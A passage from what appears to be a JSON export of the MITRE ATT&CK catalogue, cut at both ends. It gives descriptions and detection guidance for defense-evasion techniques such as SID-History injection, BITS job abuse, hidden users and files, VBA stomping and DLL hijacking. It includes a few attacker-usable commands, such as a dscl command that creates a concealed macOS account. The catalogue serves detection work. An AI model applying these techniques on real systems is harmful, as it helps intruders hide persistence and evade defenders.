        "detection": "\nLook for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process. Monitor and analyze API calls to CreateProcess/CreateProcessA, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information ). Malicious use of CreateProcess/CreateProcessA may also be proceeded by a call to UpdateProcThreadAttribute, which may be necessary to update process creation attributes.  This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.\n\n"
      },
      "T1134.005": {
        "name": "SID-History Injection",
        "description": " \nAdversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens.  \nAn account can hold additional SIDs in the SID-History Active Directory attribute  \n, allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens). \nWith Domain Administrator (or equivalent) rights, harvested or well-known SID values  \nmay be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as  Remote Services ,  Windows Admin Shares , or  Windows Remote Management .  ",
        "detection": "\nExamine data in user’s SID-History attributes using the PowerShell Get-ADUser cmdlet  , especially users who have SID-History values from the same domain.   Also monitor account management events on Domain Controllers for successful and failed changes to SID-History.    Monitor for Windows API calls to the DsAddSidHistory function.  \n\n"
      },
      "T1197": {
        "name": "BITS Jobs",
        "description": " \nAdversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through  Component Object Model (COM).  \n  \nBITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations. \nThe interface to create and manage BITS jobs is accessible through  PowerShell   \nand the  BITSAdmin tool.  \n\nAdversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.  \n  \n  \nBITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).  \n  \n\nBITS upload functionalities can also be used to perform  Exfiltration Over Alternative Protocol .  \n ",
        "detection": "\nBITS runs as a service and its status can be checked with the Sc query utility (sc query bits).   Active BITS tasks can be enumerated using the BITSAdmin tool (bitsadmin /list /allusers /verbose).  Monitor usage of the BITSAdmin tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)   Admin and the Windows Event log for BITS activity. Also consider investigating more detailed information about jobs by parsing the BITS job database.  Monitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).  \n\n"
      },
      "T1140": {
        "name": "Deobfuscate/Decode Files or Information",
        "description": " \nAdversaries may use  Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. \nOne such example is use of  certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file.  \nAnother example is using the Windows  copy /b command to reassemble binary fragments into a malicious payload.  \n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of  User Execution . The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  \n ",
        "detection": "\nDetecting the action of deobfuscating or decoding files or information may be difficult depending on the implementation. If the functionality is contained within malware and uses the Windows API, then attempting to detect malicious behavior before or after the action may yield better results than attempting to perform analysis on loaded libraries or API calls. If scripts are used, then collecting the scripts for analysis may be necessary. Perform process and command-line monitoring to detect potentially malicious behavior related to scripts and system utilities such as certutil.Monitor the execution file paths and command-line arguments for common archive file applications and extensions, such as those for Zip and RAR archive tools, and correlate with other suspicious behavior to reduce false positives from normal user and administrator behavior.\n\n"
      },
      "T1006": {
        "name": "Direct Volume Access",
        "description": " \nAdversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools.  \n\nUtilities, such as NinjaCopy, exist to perform these actions in PowerShell.  \n ",
        "detection": "\nMonitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives.  Monitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through PowerShell, additional logging of PowerShell scripts is recommended.\n\n"
      },
      "T1480": {
        "name": "Execution Guardrails",
        "description": " \nAdversaries may use execution guardrails to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary’s campaign.  \nValues an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.  \n\nGuardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical  Virtualization/Sandbox Evasion . While use of  Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.  ",
        "detection": "\nDetecting the use of guardrails may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.\n\n"
      },
      "T1480.001": {
        "name": "Environmental Keying",
        "description": " \nAdversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of  Execution Guardrails that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.  \n\nValues can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.  \n \n \n \n \nBy generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.  \n \nThese difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs). \nSimilar to  Obfuscated Files or Information , adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.  \n \n \n \n \nBy utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.  \nThis can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. \nLike other  Execution Guardrails , environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical  Virtualization/Sandbox Evasion . While use of  Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.  ",
        "detection": "\nDetecting the use of environmental keying may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.\n\n"
      },
      "T1211": {
        "name": "Exploitation for Defense Evasion",
        "description": " \nAdversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them. \nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for  Security Software Discovery . The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.  ",
        "detection": "\nExploitation for defense evasion may happen shortly after the system has been compromised to prevent detection during later actions for for additional tools that may be brought in and used. Detecting software exploitation may be difficult depending on the tools available. Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Also look for behavior on the system that might indicate successful compromise, such as abnormal behavior of processes. This could include suspicious files written to disk, evidence of Process Injection for attempts to hide execution or evidence of Discovery.\n\n"
      },
      "T1222": {
        "name": "File and Directory Permissions Modification",
        "description": " \nAdversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.  \n \nFile and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). \nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via  Accessibility Features ,  Boot or Logon Initialization Scripts ,  .bash_profile and .bashrc , or tainting/hijacking other instrumental binary/configuration files via  Hijack Execution Flow .  ",
        "detection": "\nMonitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.Consider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified. \n\n"
      },
      "T1222.001": {
        "name": "Windows File and Directory Permissions Modification",
        "description": " \nAdversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.  \n \nFile and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). \nWindows implements file and directory ACLs as Discretionary Access Control Lists (DACLs).  \nSimilar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.  \n\nAdversaries can interact with the DACLs using built-in Windows commands, such as  icacls ,  cacls ,  takeown , and  attrib , which can grant adversaries higher permissions on specific files and folders. Further,  PowerShell provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via  Accessibility Features ,  Boot or Logon Initialization Scripts , or tainting/hijacking other instrumental binary/configuration files via  Hijack Execution Flow .  ",
        "detection": "\nMonitor and investigate attempts to modify DACLs and file/directory ownership. Many of the commands used to modify DACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.Consider enabling file/directory permission change auditing on folders containing key binary/configuration files. For example, Windows Security Log events (Event ID 4670) are created when DACLs are modified. \n\n"
      },
      "T1222.002": {
        "name": "Linux and Mac File and Directory Permissions Modification",
        "description": " \nAdversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.  \n \nFile and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). \nMost Linux and Linux-based platforms provide a standard set of permission groups (user, group, and other) and a standard set of permissions (read, write, and execute) that are applied to each group. While nuances of each platform’s permissions implementation may vary, most of the platforms provide two primary commands used to manipulate file and directory ACLs:  chown (short for change owner), and  chmod (short for change mode). \nAdversarial may use these commands to make themselves the owner of files and directories or change the mode if current permissions allow it. They could subsequently lock others out of the file. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via  .bash_profile and .bashrc or tainting/hijacking other instrumental binary/configuration files via  Hijack Execution Flow .  ",
        "detection": "\nMonitor and investigate attempts to modify ACLs and file/directory ownership. Many of the commands used to modify ACLs and file/directory ownership are built-in system utilities and may generate a high false positive alert rate, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.Consider enabling file/directory permission change auditing on folders containing key binary/configuration files.\n\n"
      },
      "T1484": {
        "name": "Group Policy Modification",
        "description": " \nAdversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path  \\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\ .  \n \n \nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain. \nMalicious GPO modifications can be used to implement many other malicious behaviors such as  Scheduled Task/Job ,  Disable or Modify Tools ,  Ingress Tool Transfer ,  Create Account ,  Service Execution ,  and more.  \n \n \n \n \nSince GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.  \n\nFor example, publicly available scripts such as  New-GPOImmediateTask can be leveraged to automate the creation of a malicious  Scheduled Task/Job by modifying GPO settings, in this case modifying  <GPO_PATH>\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml .  \n \nIn some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in  <GPO_PATH>\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf , to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.  \n ",
        "detection": "\nIt is possible to detect GPO modifications by monitoring directory service changes using Windows event logs. Several events may be logged for such GPO modifications, including:Event ID 5136 - A directory service object was modifiedEvent ID 5137 - A directory service object was createdEvent ID 5138 - A directory service object was undeletedEvent ID 5139 - A directory service object was movedEvent ID 5141 - A directory service object was deletedGPO abuse will often be accompanied by some other behavior such as Scheduled Task/Job, which will have events associated with it to detect. Subsequent permission value modifications, like those to SeEnableDelegationPrivilege, can also be searched for in events associated with privileges assigned to new logons (Event ID 4672) and assignment of user rights (Event ID 4704). \n\n"
      },
      "T1564": {
        "name": "Hide Artifacts",
        "description": " \nAdversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.  \n \n \n\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.  \n ",
        "detection": "\nMonitor files, processes, and command-line arguments for actions indicative of hidden artifacts. Monitor event and authentication logs for records of hidden artifacts being used. Monitor the file system and shell commands for hidden attribute usage.\n\n"
      },
      "T1564.001": {
        "name": "Hidden Files and Directories",
        "description": " \nAdversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (  dir /a for Windows and  ls –a for Linux and macOS). \nOn Linux and Mac, users can mark specific files as hidden simply by putting a \".\" as the first character in the file or folder name  \n  \n. Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like \"ls\". Users must specifically change settings to have these files viewable. \nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app  \n. On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys. \nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.  ",
        "detection": "\nMonitor the file system and shell commands for files being created with a leading \".\" and the Windows command-line use of attrib.exe to add the hidden attribute.\n\n"
      },
      "T1564.002": {
        "name": "Hidden Users",
        "description": " \nAdversaries may use hidden users to mask the presence of user accounts they create. Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account. \nThere is a property value in  /Library/Preferences/com.apple.loginwindow called  Hide500Users that prevents users with userIDs 500 and lower from appearing at the login screen. When using the  Create Account technique with a userID under 500 (ex:  sudo dscl . -create /Users/username UniqueID 401 ) and enabling this property (setting it to Yes), an adversary can conceal user accounts.  \n.  ",
        "detection": "\nThis technique prevents the new user from showing up at the log in screen, but all of the other signs of a new user still exist. The user still gets a home directory and will appear in the authentication logs.\n\n"
      },
      "T1564.003": {
        "name": "Hidden Window",
        "description": " \nAdversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. \nOn Windows, there are a variety of features in scripting languages in Windows, such as  PowerShell , Jscript, and  Visual Basic to make windows hidden. One example of this is  powershell.exe -WindowStyle Hidden .  \n\nSimilarly, on macOS the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be  apple.awt.UIElement , which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock. \nAdversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.  \n ",
        "detection": "\nMonitor processes and command-line arguments for actions indicative of hidden windows. In Windows, enable and configure event logging and PowerShell logging to check for the hidden window style. In MacOS, plist files are ASCII text files with a specific format, so they're relatively easy to parse. File monitoring can check for the apple.awt.UIElement or any other suspicious plist tag in plist files and flag them.\n\n"
      },
      "T1564.004": {
        "name": "NTFS File Attributes",
        "description": " \nAdversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  \nWithin MFT entries are file attributes,  \nsuch as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files).  \n  \n  \n  \n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.  \n  \n ",
        "detection": "\nForensic techniques exist to identify information stored in NTFS EA.   Monitor calls to the ZwSetEaFile and ZwQueryEaFile Windows API functions as well as binaries used to interact with EA,     and consider regularly scanning for the presence of modified information.  There are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: file.ext:ads[.ext]) is commonly associated with ADSs.       For a more exhaustive list of utilities that can be used to execute and create ADSs, see https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f.The Streams tool of Sysinternals can be used to uncover files with ADSs. The dir /r command can also be used to display ADSs.   Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a -stream parameter to interact with ADSs.    \n\n"
      },
      "T1564.005": {
        "name": "Hidden File System",
        "description": " \nAdversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.  \n\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.  \n \nAnother implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.  \nAdversaries may also fragment files across the existing file system structure in non-standard ways.  \n ",
        "detection": "\nDetecting the use of a hidden file system may be exceptionally difficult depending on the implementation. Emphasis may be placed on detecting related aspects of the adversary lifecycle, such as how malware interacts with the hidden file system or how a hidden file system is loaded. Consider looking for anomalous interactions with the Registry or with a particular file on disk. Likewise, if the hidden file system is loaded on boot from reserved disk space, consider shifting focus to detecting Bootkit activity.\n\n"
      },
      "T1564.006": {
        "name": "Run Virtual Instance",
        "description": " \nAdversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.  \n\nAdversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.  \n ",
        "detection": "\nConsider monitoring for files and processes associated with running a virtual instance, such as binary files associated with common virtualization technologies (ex: VirtualBox, VMware, QEMU, Hyper-V). Consider monitoring for process command-line arguments that may be atypical for benign use of virtualization software. Usage of virtualization binaries or command-line arguments associated with running a headless (in the background with no UI) virtual instance may be especially suspect. Network adapter information may also be helpful in detecting the use of virtual instances.If virtualization software is installed by the adversary, the Registry may provide detection opportunities. Consider monitoring for Windows Service, with respect to virtualization software. Benign usage of virtualization technology is common in enterprise environments, data and events should not be viewed in isolation, but as part of a chain of behavior.\n\n"
      },
      "T1564.007": {
        "name": "VBA Stomping",
        "description": " \nAdversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.  \n\nMS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a  PerformanceCache that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the  _VBA_PROJECT stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.  \n \n\nAn adversary may hide malicious VBA code by overwriting the VBA source code location with zero’s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the  _VBA_PROJECT stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.  \n \n \n ",
        "detection": "\nDetection efforts should be placed finding differences between VBA source code and p-code.  VBA code can be extracted from p-code before execution with tools such as the pcodedmp disassembler. The oletools toolkit leverages the pcodedmp disassembler to detect VBA stomping by comparing keywords present in the VBA source code and p-code.  If the document is opened with a Graphical User Interface (GUI) the malicious p-code is decompiled and may be viewed. However, if the PROJECT stream, which specifies the project properties, is modified in a specific way the decompiled VBA code will not be displayed. For example, adding a module name that is undefined to the PROJECT stream will inhibit attempts of reading the VBA source code through the GUI. \n\n"
      },
      "T1574": {
        "name": "Hijack Execution Flow",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution. \nThere are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.  ",
        "detection": "\nMonitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.Monitor for changes to environment variables, as well as the commands to implement these changes.Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so, abnormal process call trees). Track library metadata, such as a hash, and compare libraries that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.Service changes are reflected in the Registry. Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current service information.   Suspicious program execution through services may show up as outlier processes that have not been seen before when compared against historical data.\n\n"
      },
      "T1574.001": {
        "name": "DLL Search Order Hijacking",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the search order used to load DLLs. Windows systems use a common method to look for required DLLs to load into a program.  \nHijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution. \nThere are many ways an adversary can hijack DLL loads. Adversaries may plant trojan dynamic-link library files (DLLs) in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program. Adversaries may also perform DLL preloading, also called binary planting attacks,  \nby placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL. Often this location is the current working directory of the program. Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL.  \n\nAdversaries may also directly modify the way a program loads DLLs by replacing an existing DLL or modifying a .manifest or .local redirection file, directory, or junction to cause the program to load a different DLL.  \n  \n  \n\nIf a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program.Programs that fall victim to path hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace.  ",
        "detection": "\nMonitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.\n\n"
      },
      "T1574.002": {
        "name": "DLL Side-Loading",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the library manifest used to load DLLs. Adversaries may take advantage of vague references in the library manifest of a program by replacing a legitimate library with a malicious one, causing the operating system to load their malicious library when it is called for by the victim program. \nPrograms may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests  \nare not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable by replacing the legitimate DLL with a malicious one.  \n\nAdversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.  ",
        "detection": "\nMonitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\n\n"
      },
      "T1574.004": {
        "name": "Dylib Hijacking",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking ambiguous paths  used to load libraries. Adversaries may plant trojan dynamic libraries, in a directory that will be searched by the operating system before the legitimate library specified by the victim program, so that their malicious library will be loaded into the victim program instead.  MacOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. \nA common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself.  \n  \n\nIf the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level.  ",
        "detection": "\nObjective-See's Dylib Hijacking Scanner can be used to detect potential cases of dylib hijacking. Monitor file systems for moving, renaming, replacing, or modifying dylibs. Changes in the set of dylibs that are loaded by a process (compared to past behavior) that do not correlate with known software, patches, etc., are suspicious. Check the system for multiple dylibs with the same name and monitor which versions have historically been loaded into a process. \n\n"
      },
      "T1574.005": {
        "name": "Executable Installer File Permissions Weakness",
        "description": " \nAdversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM. \nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the  %TEMP% directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of  DLL Search Order Hijacking . \nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to  Bypass User Account Control . Several examples of this weakness in existing common installers have been reported to software vendors.  \n  \nIf the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.  ",
        "detection": "\nLook for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.\n\n"
      },
      "T1574.006": {
        "name": "LD_PRELOAD",
